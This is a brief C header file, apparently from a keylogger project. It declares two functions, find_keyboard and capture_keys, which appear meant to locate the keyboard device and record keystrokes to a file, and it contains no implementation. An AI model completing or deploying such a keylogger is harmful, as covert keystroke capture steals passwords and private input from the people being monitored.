#ifndef KEYLOGGER
#define KEYLOGGER
#include <stdio.h>

void find_keyboard(char *buffer, FILE *file);

void capture_keys(FILE * file, char *event);

#endif